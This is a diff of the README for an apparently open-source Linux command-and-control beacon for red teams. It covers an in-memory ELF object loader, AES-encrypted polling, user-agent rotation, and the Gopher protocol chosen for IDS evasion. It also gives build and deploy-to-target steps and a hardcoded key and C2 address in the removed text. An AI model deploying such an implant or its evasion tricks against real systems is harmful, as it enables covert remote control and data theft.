@@ -1,607 +1,224 @@
-# 🌋 Black Sand Beacon
+# Black Sand Beacon
 
-<img width="720" height="720" alt="image" src="https://github.com/user-attachments/assets/fb294783-0f5a-46d3-8392-98993fa6c303" />
+A Linux C2 beacon with a native in-memory ELF BOF loader, written in
+C with no Go or Rust runtime. Designed to plug into the LazyOwn
+RedTeam framework and inspired by Cobalt Strike's Beacon Object
+Files.
 
+This repository contains:
 
-Black Sand Beacon — a lightweight, memory-resident micro beacon or implant for the LazyOwn RedTeam Framework — is the first offensive platform to deliver true native BOF (Beacon Object File) support for Linux. Inspired by the Windows-based Black Basalt Beacon, it enables red teams to write position-independent, fileless post-exploitation modules in pure C—no assembly required. Unlike traditional Linux payloads that rely on shellcode, interpreted scripts, or full binary deployment, Black Sand executes relocatable ELF objects directly in memory, resolving symbols and applying relocations on-the-fly. This breakthrough brings the agility, safety, and developer experience of Cobalt Strike–style BOFs to Linux for the very first time.
+* **Beacons** in `beacons/v1/`, `beacons/v2/`, `beacons/v3/`
+  Three variants of the same HTTPS/CFB beacon. v1 is the canonical
+  pull-mode beacon. v2 adds mesh/p2p discovery. v3 is an
+  experimental branch.
+* **BOFs** in `bof/<name>/bof.c`
+  Position-independent ELF objects the beacon can fetch and execute
+  in memory. The five included are: `whoami`, `is_sudo`, `cat`,
+  `userenum`, `suid_enum`.
+* **C2 server** in `c2/server.py`
+  A small Python Gopher-like server that serves commands, accepts
+  results, and hosts BOFs.
+* **Shared library** in `include/`
+  AES-256 standalone (`aes.c`/`aes.h`), cJSON, the runtime
+  configuration loader (`config.c`/`config.h` plus the Python
+  mirror `config_py.py`), and the AES-256-CFB wrappers shared by
+  the beacon and the tests.
+* **Build** in `Makefile`, **CI** in `.github/workflows/ci.yml`,
+  **tests** in `tests/`.
 
-- Command execution
-- Bof Execution
-  - issue_command_to_c2 linux bof:https://10.10.14.57/whoami.x64.o
+For a 5-minute end-to-end run, see [QUICKSTART.md](QUICKSTART.md).
+For the BOF authoring guide, see [docs/BOF_AUTHORING.md](docs/BOF_AUTHORING.md).
+For the C2 wire protocol, see [docs/PROTOCOL.md](docs/PROTOCOL.md).
 
-## Linux ELF BOF Loader - First Native C Implementation
+## Requirements
 
-**Background**: After implementing COFFLoader3 (Windows COFF with DJB2 hashing) 
-and BlackBasalt C2, this represents the first fully native C implementation 
-of a Cobalt Strike-style beacon for Linux with complete ELF BOF support.
+Build (Debian/Ubuntu):
 
-## Key Features
-- ✅ Native C (no Go/Rust runtime)
-- ✅ Full ELF relocation support (R_X86_64_64/32/PC32/PLT32)
-- ✅ Automatic trampoline generation for long jumps
-- ✅ System V ABI compliant (variadic function support)
-- ✅ Beacon API compatible (BeaconPrintf, BeaconOutput)
-- ✅ AES-256-CFB encrypted C2 communication
-
-## Technical Innovations
-1. **Trampoline Cache System**: Solves Linux address space challenges
-2. **Stack Alignment**: Proper handling of movaps/variadic functions
-3. **Symbol Resolution**: Dynamic symbol table with fallback
-
-## Credits
-- Inspired by TrustedSec's COFFLoader (Windows)
-- Built upon experience with COFFLoader3 and BlackBasalt beacon
-
-## Comparison
-| Feature | This Project | Sliver | Mythic | CrossC2 |
-|---------|--------------|--------|--------|---------|
-| Language | C (native) | Go | Rust | Closed |
-| Open Source | ✅ | ✅ | ✅ | ❌ |
-| Standalone | ✅ | ✅ | ✅ | Needs CS |
-
-## 📱 System Architecture
-Black Sand Beacon is a modular C2 agent with a layered architecture consisting of:
-
-- Beacon Core: Main orchestrator implementing the command polling loop
-- Cryptography Layer: Dual encryption (TLS + AES-256 CFB) with Base64 encoding
-- Execution Engines: Shell command executor and in-memory ELF loader for BOFs
-- Data Processing: JSON serialization using cJSON library
-- Network Layer: HTTPS communication via libcurl with malleable C2 profiles
-
-<img width="1212" height="496" alt="image" src="https://github.com/user-attachments/assets/cbef470a-71ba-40be-b53e-1c766162f4c8" />
-
-
-## 🚨 Beacon Core Loop
-The main execution loop resides in main() at 
-beacon3.c
-637-808
- The beacon operates in a continuous 6-second polling cycle:
-
-<img width="1194" height="833" alt="image" src="https://github.com/user-attachments/assets/f09383f2-31ea-41e8-aae3-98118bb98607" />
-
-
-## 🚀 Initialization 
-beacon3.c
-638-648
-:
-
-### 🔑 Generates AES key from hex string KEY_HEX
-Constructs C2 URL using C2_URL, MALEABLE, and CLIENT_ID constants
-Initializes random seed for User-Agent rotation
-Command Retrieval 
-beacon3.c
-650-693
-:
-
-<img width="1288" height="747" alt="image" src="https://github.com/user-attachments/assets/dbd805cf-040f-496a-afd3-faa3a297dc92" />
-
-
-### 📥 Issues HTTPS GET request to C2 server
-Base64 decodes response
-Extracts IV from first 16 bytes
-AES-256 CFB decrypts command payload
-Command Execution 
-beacon3.c
-695-716
-:
-
-### 📟 Shell commands: Execute via exec_cmd() using popen()
-BOF commands: Download ELF via download_bof(), execute via RunELF()
-Result Transmission 
-beacon3.c
-726-796
-:
-
-### { } Constructs JSON with system metadata and command output
-AES-256 CFB encrypts with random IV
-Base64 encodes payload
-POSTs to C2 server
-
-## 🇨➁ Malleable C2 Profile
-URL construction uses configurable components 
-beacon3.c
-32-34
-:
-
-- C2_URL: Base server address
-- MALEABLE: URI path pattern (/pleasesubscribe/v1/users/)
-- CLIENT_ID: Beacon identifier (linux)
-
-## 📡 C2 Communication Protocol
-
-This document describes the HTTPS-based command and control communication protocol used by the Black Sand Beacon to communicate with the LazyOwn RedTeam Framework C2 server. It covers the transport layer, encryption mechanisms, message encoding, request/response patterns, and malleable C2 profile configuration.
-
-For information about command execution after receiving C2 instructions, see Command Execution. For details on the cryptographic implementations, see Encryption Protocol.
-
-## 🗂️ Protocol Overview
-The Black Sand Beacon implements a pull-based C2 protocol over HTTPS with dual-layer encryption. The beacon continuously polls the C2 server at regular intervals to retrieve commands, executes them, and transmits results back to the server. All communications use TLS for transport security plus an additional application-level AES-256 CFB encryption layer.
-
-## ✈️ Transport Layer
-### 🌍 HTTPS Configuration
-The beacon uses libcurl for all HTTP/HTTPS communications. The https_request function handles both command retrieval (GET) and result transmission (POST).
-
-CURL Configuration Details:
-
-The https_request function 
-beacon3.c
-154-240
- configures the following critical options:
-
-### 🛡️ SSL Verification Disabled 
-beacon3.c
-175-176
-: Both CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST are set to 0L to allow connections to C2 servers with self-signed certificates
-Timeout Settings 
-beacon3.c
-177-178
-: 10-second overall timeout, 5-second connection timeout
-User-Agent Randomization 
-beacon3.c
-174
-: Randomly selects from USER_AGENTS array to vary traffic fingerprint
-Memory Callback 
-beacon3.c
-180-181
-: Uses WriteMemoryCallback to accumulate response data in a dynamically allocated buffer
-Sources: 
-beacon3.c
-154-240
- 
-beacon3.c
-136-151
-
-### 🔗 URL Construction and Malleable Profiles
-The beacon constructs C2 URLs using configurable components to enable traffic blending:
-
-Malleable C2 Configuration:
-
-Constant	Default Value	Purpose	Location
-C2_URL	"https://10.10.14.57:4444"	Base C2 server address	
-beacon3.c
-32
-MALEABLE	"/pleasesubscribe/v1/users/"	URI path for traffic blending	
-beacon3.c
-34
-CLIENT_ID	"linux"	Client identifier	
-beacon3.c
-33
-The full URL is constructed at initialization: full_url = C2_URL + MALEABLE + CLIENT_ID 
-beacon3.c
-646-647
-
-### 🕷️ User-Agent Rotation:
-
-The beacon randomly selects from 4 User-Agent strings 
-beacon3.c
-37-42
- on each request 
-beacon3.c
-174
-:
-
-- Chrome on Linux x86_64
-- Firefox on Ubuntu
-- Chrome on Android mobile
-- Chrome on Windows 10
-Sources: 
-beacon3.c
-32-42
- 
-beacon3.c
-646-647
- 
-beacon3.c
-174
-
-## 🪦 Encryption Layer
-AES-256 CFB Implementation
-The beacon implements a custom AES-256 Cipher Feedback (CFB) mode for application-level encryption. This provides an additional security layer beyond TLS, protecting payloads even if TLS is compromised.
-
-CFB Mode Implementation Details:
-
-Both aes256_cfb_encrypt 
-beacon3.c
-283-309
- and aes256_cfb_decrypt 
-beacon3.c
-311-338
- follow the CFB algorithm:
-
-### ➡️ Initialization 
-beacon3.c
-285-289
- 
-beacon3.c
-313-317
-: Initialize AES context with 256-bit key, copy IV to working buffer
-Block Processing 
-beacon3.c
-291-306
- 
-beacon3.c
-319-334
-:
-Encrypt IV buffer using AES-ECB: AES_ECB_encrypt(&ctx, encrypted_iv) 
-beacon3.c
-294
- 
-beacon3.c
-322
-XOR result with plaintext/ciphertext block 
-beacon3.c
-296-298
- 
-beacon3.c
-324-326
-Update IV buffer with output ciphertext 
-beacon3.c
-300-304
- 
-beacon3.c
-328-332
-Output 
-beacon3.c
-307-308
- 
-beacon3.c
-335-337
-: Return encrypted/decrypted buffer
-Sources: 
-beacon3.c
-283-338
- 
-aes.c
-239-242
- 
-aes.c
-490-494
-
-### 🗝️ Key Management
-The AES-256 key is hardcoded in the beacon binary as a hexadecimal string and converted to binary at runtime:
-
-// Key initialization in main()
-const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
-unsigned char AES_KEY[32];
-for (int i = 0; i < 32; i++) {
-    sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
-}
-### 🐚 IV Generation:
-
-Outbound Messages: Random 16-byte IV generated using OpenSSL's RAND_bytes(iv_out, 16) 
-beacon3.c
-763
-Inbound Messages: IV extracted from first 16 bytes of encrypted payload 
-beacon3.c
-675-676
-Sources: 
-beacon3.c
-640-644
- 
-beacon3.c
-763
- 
-beacon3.c
-675-676
-
-Message Format
-Inbound Message Structure (Commands)
-Commands received from the C2 server follow this structure:
-
-### 🏗️ Processing Pipeline:
-
-Receive 
-beacon3.c
-656
-: GET request to full_url returns Base64-encoded payload
-Decode 
-beacon3.c
-667
-: base64_decode(b64_resp, &enc_len) → encrypted bytes
-Extract IV 
-beacon3.c
-675-676
-: First 16 bytes are the IV, remainder is ciphertext
-Decrypt 
-beacon3.c
-678
-: aes256_cfb_decrypt(AES_KEY, iv, ciphertext, enc_len - 16, &plain_len) → plaintext command
-Command Types:
-
-### ⚡ Command Pattern	Action	Handler Location
-bof:<url>	Download and execute BOF from URL	
-beacon3.c
-698-712
-Any other string	Execute as shell command via popen()	
-beacon3.c
-714
-Sources: 
-beacon3.c
-656-693
- 
-beacon3.c
-698-716
- 
-beacon3.c
-243-280
- 
-beacon3.c
-311-338
-
-### 📊 Outbound Message Structure (Results)
-Results transmitted to the C2 server are JSON objects encrypted and encoded:
-
-<img width="850" height="819" alt="image" src="https://github.com/user-attachments/assets/ca77775f-9a08-4775-9268-5734112d0f5a" />
-
-
-JSON Structure:
-
-The beacon constructs a JSON object using the cJSON library 
-beacon3.c
-734-744
-:
-```json
-{
-  "output": "<command/BOF output>",
-  "client": "linux",
-  "command": "<executed command>",
-  "pid": 1234,
-  "hostname": "<system hostname>",
-  "ips": "<comma-separated local IPs>",
-  "user": "<username>",
-  "discovered_ips": "",
-  "result_portscan": null,
-  "result_pwd": "<current working directory>"
-}
+```
+sudo apt-get install gcc libcurl4-openssl-dev libssl-dev make
 ```
 
-<img width="496" height="871" alt="image" src="https://github.com/user-attachments/assets/9be4b106-f71b-487f-8044-8f19c314ebc1" />
+Runtime for the C2 server:
 
-
-### 📩 Encryption and Transmission:
-
-Serialize 
-beacon3.c
-746
-: cJSON_PrintUnformatted(root) → JSON string
-Generate IV 
-beacon3.c
-763
-: RAND_bytes(iv_out, 16) → random IV
-Encrypt 
-beacon3.c
-765
-: aes256_cfb_encrypt(AES_KEY, iv_out, json_str, strlen(json_str), &encrypted_len) → ciphertext
-Concatenate 
-beacon3.c
-768-770
-: IV || Ciphertext → combined buffer
-Encode 
-beacon3.c
-771
-: base64_encode(full_enc, 16 + encrypted_len) → Base64 string
-Transmit 
-beacon3.c
-777
-: https_request(full_url, "POST", b64_resp) → send to C2
-Sources: 
-beacon3.c
-726-796
- 
-beacon3.c
-243-258
- 
-beacon3.c
-283-309
-
-<img width="1006" height="871" alt="image" src="https://github.com/user-attachments/assets/ddcfc707-111b-42e0-a022-de0027545655" />
-
-
-### 💬 Request/Response Flow
-Main Communication Loop
-The beacon operates in a continuous polling loop with a fixed interval:
-
-## 🧙🏼‍♂️ BOF Concept
-A Beacon Object File (BOF) is a compiled ELF relocatable object file (.o) that contains custom functionality to be executed by the beacon. BOFs enable modular capability extension without modifying the core beacon executable.
-
-<img width="798" height="764" alt="image" src="https://github.com/user-attachments/assets/312be6a3-6e14-437e-b985-5ef285d2035c" />
-
-
-### ⚙️ ELF Loading Mechanism
-The RunELF function at 
-beacon3.c
-361-532
- implements a complete in-memory ELF loader that parses relocatable object files and prepares them for execution.
-
-<img width="396" height="873" alt="image" src="https://github.com/user-attachments/assets/e5c363ba-203f-4c64-b531-5dd8a2447c36" />
-
-
-### 🗂️ Symbol Resolution
-BOFs reference external functions (libc, beacon API) that must be resolved at load time. The beacon maintains a symbol resolver table that maps symbol names to function pointers.
-
-### 🧠 Symbol Resolver Table
-The g_external_symbols[] array at 
-beacon3.c
-76-90
- defines all externally visible symbols:
-
-### 👉 Symbol Name	Pointer Variable	Purpose
-- printf	g_printf_ptr	Standard output (debugging)
-- strlen	g_strlen_ptr	String length calculation
-- memcpy	g_memcpy_ptr	Memory copy operations
-- memset	g_memset_ptr	Memory initialization
-- BeaconPrintf	g_BeaconPrintf_ptr	Formatted output to beacon
-- BeaconOutput	g_BeaconOutput_ptr	Raw output to beacon
-- dlsym	g_dlsym_ptr	Dynamic symbol lookup
-- dlopen	g_dlopen_ptr	Dynamic library loading
-
-### 🧮 Symbol Resolution Algorithm
-Sources: 
-beacon3.c
-461-470
-
-<img width="1711" height="840" alt="image" src="https://github.com/user-attachments/assets/26cb7242-247c-4d5c-9071-e2d3be94e613" />
-
-
-### 🧩 The resolution process at 
-beacon3.c
-461-470
- first checks if a symbol is defined within the BOF itself (local symbol), then falls back to the external symbol table. Unresolved symbols are logged but do not halt execution.
-
-### 📐 Relocation Processing
-After loading sections into memory, the loader must patch code and data references to point to their actual runtime addresses. This is accomplished by processing SHT_RELA sections.
-
-### 🧬 Supported Relocation Types
-Type	Value	Description	Implementation
-- R_X86_64_64	1	64-bit absolute address	*loc = symbol_addr + addend
-- R_X86_64_PC32	2	32-bit PC-relative offset	*loc = symbol_addr + addend - loc
-- R_X86_64_PLT32	4	32-bit PLT-relative offset	Same as PC32
-- R_X86_64_32	10	32-bit absolute address	*loc = (uint32_t)(symbol_addr + addend)
-
-### 👨🏻‍💻 Execution Model
-Once the ELF is loaded and relocated, the beacon locates the go function and executes it in an isolated stack frame.
-
-### e = ∑∞ⁿ⁼⁰ ¹ₙ Entry Point Discovery
-The loader searches the symbol table for a function named go:
-
-<img width="1724" height="663" alt="image" src="https://github.com/user-attachments/assets/8ba4d51f-84ba-46fc-a349-c230324c6b6e" />
-
-
-### 🚩 Overview
-The ELF loader is implemented in the RunELF function, which performs the following operations:
-
-<img width="567" height="905" alt="image" src="https://github.com/user-attachments/assets/349779d2-0af7-427c-a6a1-ada6ff0705db" />
-
-
-- ELF validation - Verifies ELF magic bytes and architecture
-- Section parsing - Locates symbol tables, string tables, and loadable sections
-- Memory mapping - Allocates RWX memory regions for code and data sections
-- Symbol resolution - Resolves external symbols using dlsym and a predefined symbol table
-- Relocation processing - Applies ELF relocations to resolve references
-- Function lookup - Locates the entry point function by name
-- Execution - Invokes the BOF using a stack-aligned assembly wrapper
-
-<img width="566" height="851" alt="image" src="https://github.com/user-attachments/assets/fe45fc29-6ab5-47f6-94ea-1dedda815547" />
-
-<img width="478" height="856" alt="image" src="https://github.com/user-attachments/assets/325ffdc2-f3d3-41f9-b2bb-0f46d5ac5abe" />
-
-## 🔷 Gopher Protocol C2
-
-Black Sand Beacon now includes full support for the Gopher protocol as a command and control (C2) channel. The Gopher protocol (RFC 1436) is a lightweight, simple communication protocol designed in the early 1990s that offers unique advantages for modern offensive operations.​
-
-## Why Gopher?
-Evasion: Extremely rare protocol in modern networks, making detection by traditional IDS/IPS systems difficult​
-
-Simplicity: Minimalist protocol that generates less network noise than HTTP/HTTPS​
-
-Low profile: Most security tools do not inspect Gopher traffic​
-
-Flexible: Supports transmission of text, binaries, and encrypted commands​
-
-Legacy advantage: Many firewalls and monitoring solutions lack proper Gopher protocol inspection​
-
-## Features
-✅ AES-256-CFB encryption for all communications
-
-✅ Base64-encoded command and result transmission
-
-✅ Support for remote BOF (Beacon Object Files) downloads
-
-✅ Automatic logging in CSV format
-
-✅ Multi-client session management
-
-✅ Customizable port (default 7070, standard 70)
-
-✅ Simple selector-based routing
-
-## Installation
-Requirements
-```bash
-pip3 install cryptography
+```
+pip install -r requirements.txt
 ```
 
-## Directory Structure
-```text
-c2_gopher/
-├── c2_gopher.py          # Main C2 server
-├── beacon_gopher         # Compiled beacon binary
-├── sessions/
-│   ├── logs/            # Client session logs (CSV)
-│   └── uploads/         # BOF files for download
-```
-## Quick Start
-1. Generate AES Key
-```bash
-python3 -c "import os; print(os.urandom(32).hex())"
-```
-Update the AES_KEY variable in both c2_gopher.py and recompile beacon_gopher with the new key.
+## Build
 
-2. Start the C2 Server
-```bash
-python3 c2_gopher.py
 ```
-The server will listen on gopher://0.0.0.0:7070/ by default.
-
-3. Deploy the Beacon
-```bash
-./beacon_gopher
+make config        # one-time: copies config.example.json -> config.json
+make beacon        # builds build/beacon (runnable, with build/config.json staged next to it)
+make bofs          # builds all BOFs into build/bof/*.x64.o
+make all-beacons   # builds v1, v2, v3
+make test          # runs the full test suite
+make clean         # removes build/
 ```
-The beacon will start checking for commands from the C2 server.
 
-4. Issue Commands
-In the C2 server terminal, you'll be prompted to enter commands:
+After `make beacon`, the binary is ready to run:
 
-```text
+```
+./build/beacon
+```
+
+It reads `build/config.json` (next to itself) via the binary-relative
+search path, so no `BSB_CONFIG` or `cd config/` is needed. The same
+binary copied to another host works identically as long as a
+`config.json` sits next to it.
+
+If you only want to rebuild one BOF:
+
+```
+make bof-whoami
+make bof-suid_enum
+```
+
+## Deploy to another host (optional)
+
+For shipping to a target, the Makefile has an `install` target that
+stages a self-contained directory:
+
+```
+make install-all DESTDIR=/tmp/deploy
+scp -r /tmp/deploy/* user@target:/opt/bsb/
+ssh user@target /opt/bsb/beacon
+```
+
+This is **not** the normal flow. Use it only when you need to
+bundle the binary + config + BOFs into a single directory you can
+copy somewhere.
+
+## Run the C2
+
+```
+python3 c2/server.py
+```
+
+The server binds `0.0.0.0:7070` by default and reads its AES key
+and C2 URI from `config/config.json`. Override the config path
+with `BSB_CONFIG=/path/to/config.json`.
+
+Once the server is up you can inject commands from the REPL:
+
+```
 Client ID: linux
-Command: whoami
-[+] Command 'whoami' queued for linux
+Command:   id
 ```
-## Protocol Flow
-Command Retrieval (Beacon → C2)
-Beacon connects to C2 on port 7070
 
-Sends selector: /pleasesubscribe/v1/users/<client_id>
+## Run the beacon
 
-C2 responds with AES-encrypted command (Base64)
+```
+./build/beacon
+```
 
-Beacon decrypts and executes command
+The beacon reads `config/config.json` (relative to the binary, found
+via the binary-relative search path), polls the C2, and prints
+what it sends and receives. With no commands queued it just
+sleeps between polls.
 
-Result Submission (Beacon → C2)
-Beacon encrypts execution result with AES
+To run a BOF, the C2 returns a JSON object with a `bof` field
+pointing at `/bof/<name>.x64.o`. The beacon fetches the file and
+loads it into its own process via the in-memory ELF loader
+(`RunELF` in `beacons/v1/beacon.c`).
 
-Encodes as Base64
+## Configuration
 
-Sends selector: /report/<base64_payload>
+All operational parameters live in `config/config.json` and are
+read at startup. Nothing is baked into the binaries.
 
-C2 decrypts, parses JSON, and logs to CSV
+| Section | Key | Default | Purpose |
+|---|---|---|---|
+| `c2` | `url` | `https://127.0.0.1:4444` | C2 base URL |
+| `c2` | `uri` | `/api/poll/` | URI path before the client id |
+| `c2` | `client_id` | `linux` | Beacon identifier |
+| `crypto` | `aes_key_hex` | (placeholder) | 64 hex chars = 32 bytes |
+| `crypto` | `mode` | `cfb` | Encryption mode |
+| `timing` | `sleep_seconds` | `6` | Base poll interval |
+| `timing` | `jitter_percent` | `20` | +/- percent jitter on sleep |
+| `timing` | `curl_timeout_seconds` | `10` | libcurl total timeout |
+| `timing` | `curl_connect_timeout_seconds` | `5` | libcurl connect timeout |
+| `network` | `user_agents` | (4 strings) | Rotation list |
+| `network` | `verify_tls` | `false` | C2 TLS verification |
+| `bof` | `download_chunk_size` | `4096` | BOF download buffer |
 
-BOF Download (Beacon → C2)
-Beacon requests: /bof/<filename>
+The CI runs a guardrail that fails the build if a 64-char hex key
+appears in source. Real keys belong in `config/config.json`, which
+is git-ignored.
 
-C2 responds with Base64-encoded BOF
+## Writing a new BOF
 
-Beacon decodes and executes in memory
+A BOF is just a C source file that exports `void go(char *args, int alen)`.
+Include `bof/include/beacon_api.h` for the callback API and
+`bof/include/syscalls.h` for direct-syscall helpers. Compile it
+position-independent and with no libc:
 
-## 🔗 Links (Because Sharing Is Power)
-- 📓 Wiki: [https://deepwiki.com/grisuno/blacksandbeacon](https://deepwiki.com/grisuno/blacksandbeacon)
-- 📰 Blog: [https://medium.com/@lazyown.redteam/black-sand-beacon-when-your-linux-box-starts-whispering-to-c2-in-aes-256-cfb-and-no-one-notices-105ca5ed9547](https://medium.com/@lazyown.redteam/black-sand-beacon-when-your-linux-box-starts-whispering-to-c2-in-aes-256-cfb-and-no-one-notices-105ca5ed9547)
-- 🎤 Podcast: [https://www.podbean.com/eas/pb-qe42t-198ee9d](https://www.podbean.com/eas/pb-qe42t-198ee9d)
-- 🐙 GitHub: [https://github.com/grisuno/beacon](https://github.com/grisuno/beacon)
-- 🐙 GitHub: [https://github.com/grisuno/LazyOwn](https://github.com/grisuno/LazyOwn)
-- 🩸 Patreon: [https://www.patreon.com/c/LazyOwn](https://www.patreon.com/c/LazyOwn)
-- 🐙 GitHub: [https://github.com/grisuno/CVE-2022-22077](https://github.com/grisuno/CVE-2022-22077)
-- 🧠 LazyOwn Framework: [https://github.com/grisuno/LazyOwn](https://github.com/grisuno/LazyOwn)
-- 🌐 Web: [https://grisuno.github.io/LazyOwn/](https://grisuno.github.io/LazyOwn/)
-- 📰 Blog: [https://medium.com/@lazyown.redteam](https://medium.com/@lazyown.redteam)
-- 🎥 Videolog: [https://youtu.be/spgLpv3XkiA](https://youtu.be/spgLpv3XkiA)
-- 🧪 QuantumVault: [https://quantumvault.pro/landing](https://quantumvault.pro/landing)
-- 🧑‍💻 HTB: [https://app.hackthebox.com/users/1998024](https://app.hackthebox.com/users/1998024)
-- ☕ Ko-fi: [https://ko-fi.com/grisuno](https://ko-fi.com/grisuno) (Buy me a yerba mate for the next all-nighter)
+```
+gcc -c -fPIC -nostdlib -m64 -O2 -I bof/include bof/<name>/bof.c -o build/bof/<name>.x64.o
+```
 
+The `make bof-<name>` target wraps this. Drop the resulting
+`.x64.o` into `sessions/uploads/` on the C2 host and trigger it
+by returning a command like `bof:<name>` from your command
+injection.
 
+See [docs/BOF_AUTHORING.md](docs/BOF_AUTHORING.md) for the full
+contract.
 
+## Testing
 
+```
+make test
+```
 
-![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+The test suite is split into several files in `tests/`:
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
+| File | What it covers |
+|---|---|
+| `test_config.py` | C JSON config loader: defaults, overrides, errors |
+| `test_crypto.py` | AES-256-CFB roundtrip and Python/C interop |
+| `test_bof_compile.py` | Every BOF compiles, exports `go`, has no libc leak |
+| `test_beacon_build.py` | Beacon binary builds, exposes BOF API + RunELF |
+| `test_c2_server.py` | C2 dispatcher: GET/POST/BOF, path-traversal hardening |
+| `test_c2_http_e2e.py` | Real HTTP/1.1 socket roundtrip with crypto |
+| `test_install_deploy.py` | `make` workflow produces a runnable tree, `make clean` wipes it |
+
+## Repository layout
+
+```
+beacons/
+  v1/beacon.c        canonical beacon
+  v2/beacon.c        mesh/p2p variant
+  v3/beacon.c        experimental variant
+bof/
+  include/           shared BOF headers (beacon_api.h, syscalls.h)
+  whoami/bof.c       sample: print effective UID
+  is_sudo/bof.c      sample: check sudo/wheel membership
+  cat/bof.c          sample: read a file
+  userenum/bof.c     sample: list /etc/passwd users and privileges
+  suid_enum/bof.c    privesc recon: walk FS, list SUID/SGID binaries
+c2/
+  server.py          Gopher-style C2 server
+config/
+  config.example.json  template (copy to config.json)
+include/
+  config.h, config.c  runtime config loader
+  config_py.py        Python mirror for the C2
+  aes.h, aes.c        standalone AES (ECB/CTR/CBC)
+  aes_cfb.h, aes_cfb.c  AES-256-CFB the beacon actually uses
+  cJSON.h, cJSON.c     vendored JSON parser
+  beacon.h            BOF API the beacon implements
+tests/
+  test_*.py           Python test suite
+  *_harness.c         C test harnesses
+docs/
+  PROTOCOL.md         wire protocol
+  BOF_AUTHORING.md    BOF contract and gotchas
+.github/workflows/
+  ci.yml              build + test + key-leak guard
+Makefile
+requirements.txt      C2 server runtime deps
+```
+
+## License
+
+GPL v3. See `LICENSE`.
